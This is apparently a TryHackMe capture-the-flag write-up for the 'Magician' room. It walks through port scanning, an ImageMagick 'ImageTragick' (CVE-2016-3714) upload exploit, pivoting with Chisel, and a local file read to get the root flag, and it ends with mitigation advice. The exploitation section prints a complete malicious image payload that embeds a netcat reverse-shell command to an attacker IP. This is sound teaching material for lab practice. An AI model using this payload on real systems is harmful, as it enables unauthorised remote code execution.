# Magician – TryHackMe Writeup 🎩✨

- **Room Name:** Magician  
- **Target IP:** 10.66.164.222  
- **Platform:** TryHackMe  
- **Room Link:** https://tryhackme.com/room/magician  

---

## 🧭 Initial Setup

Before starting, the machine required adding the domain to `/etc/hosts` to function correctly:

```bash
sudo nano /etc/hosts
```

Add:

```
10.66.164.222    magician
```

Now we’re ready to begin enumeration.

---

# 🔎 Information Gathering & Port Scanning

I started with an aggressive Nmap scan to identify open ports, services, and versions:

```bash
nmap 10.66.164.222 -sCV -A -T4
```

### 📡 Scan Results

| Port | State | Service | Version |
|------|-------|----------|----------|
| 21   | Open  | FTP      | vsftpd 2.0.8 or later |
| 8080 | Open  | HTTP     | JSON-based API (No title) |
| 8081 | Open  | HTTP     | nginx 1.14.0 (Ubuntu) |

Observations:

- **FTP (21)**: Accessible but restricted. Important commands were denied.
- **8080**: Returns JSON 404 responses. Likely a backend service.
- **8081**: Nginx web server. Title: `magician`.

So, our primary attack surface is clearly the web application.

---

# 🌐 Web Enumeration

Since FTP was restricted, I shifted focus to the web services on ports **8080** and **8081**.

After browsing the site on port 8081, I discovered an **upload feature**. That’s always interesting 👀

I attempted to upload:

- A simple image → ❌ Blocked  
- Different file formats → ❌ Blocked  

This suggests filtering is in place.

---

# 💥 Exploitation – ImageMagick RCE (CVE-2016-3714)

After researching upload bypass techniques, I discovered the vulnerability:

> **ImageMagick “ImageTragick” – CVE-2016-3714**

This vulnerability allows **Remote Code Execution (RCE)** via malicious image files when ImageMagick processes user-controlled input.

So… time to do some magic 🎩

---

## 🧪 Crafting the Malicious Payload

Create a file named:

```bash
any_name.png
```

Insert the following payload (replace `<your_ip>` with your attacking machine IP):

```bash
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|mkfifo /tmp/gjdpez; nc <your_ip> 4444 0</tmp/gjdpez | /bin/sh >/tmp/gjdpez 2>&1; rm /tmp/gjdpez'
pop graphic-context
```

---

## 🎧 Start Listener

On your attacking machine:

```bash
nc -lvnp 4444
```

Upload the malicious image through the web application.

🎉 Boom — Reverse shell received!

---

# 🏁 User Flag

Once inside, navigate to the home directory and retrieve:

```bash
cat /home/<user>/user.txt
```

User flag acquired ✅

---

# ⬆️ Privilege Escalation

Next step: Enumerate local services.

```bash
netstat -tulpn | grep LISTEN
```

Interesting discovery:

- A service is listening on **port 6666**, but only locally.

So we need to access it via **reverse tunneling**.

---

# 🚇 Pivoting with Chisel

### Step 1 – Upload Chisel to Target

Transfer `chisel` to the target machine.

---

### Step 2 – Start Chisel Server (Attacker Machine)

```bash
./chisel server -p 10000 --reverse
```

---

### Step 3 – Start Chisel Client (Target Machine)

```bash
./chisel client <your_kali_ip>:10000 R:8081:127.0.0.1:6666
```

This forwards remote port `6666` to your local `8081`.

---

# 🧠 Internal Service Discovery

Now, access locally:

```
http://127.0.0.1:8081
```

And yes — it’s another web application 👀

It contains an **input field**.

Testing it reveals something critical:

🚨 The application reads files directly from the server.

So naturally, we try:

```
/root/root.txt
```

And it returns the content — but encoded in **ROT13**.

---

# 🔓 Decoding the Root Flag

Use CyberChef (or any ROT13 decoder):

- Operation: ROT13  
- Paste the encoded flag  

And voilà 🎉

Root flag obtained.

---

# 🏆 Final Summary

| Stage | Technique |
|--------|------------|
| Initial Access | ImageMagick RCE (CVE-2016-3714) |
| Shell | Reverse shell via malicious image |
| Pivoting | Chisel reverse tunneling |
| Privilege Escalation | Local file read via internal web service |
| Root Flag | Retrieved & decoded from ROT13 |

---

# 🛡️ Real-World Mitigation

If this were a real-world production system, here’s how to prevent this attack chain:

### 1️⃣ Patch ImageMagick
- Update to a non-vulnerable version.
- Disable external delegates in `policy.xml`.

### 2️⃣ Validate File Uploads Properly
- Strict MIME-type validation.
- Re-encode images server-side.
- Store uploads outside web root.

### 3️⃣ Principle of Least Privilege
- Internal services should not run as root.
- Sensitive files must have strict permissions.

### 4️⃣ Restrict Local Services
- Avoid exposing file-read functionality.
- Implement proper authentication & input validation.

### 5️⃣ Disable Unnecessary Services
- If port 6666 service is not needed externally, sandbox it.

---

# 🎩 Closing Thoughts

This room is a beautiful example of:

- Chaining vulnerabilities  
- Thinking beyond the obvious  
- Pivoting into internal services  
- Exploiting file read logic  

Clean exploitation path, very fun machine.

Happy hacking 🔥  
See you in the next pwn writeup.
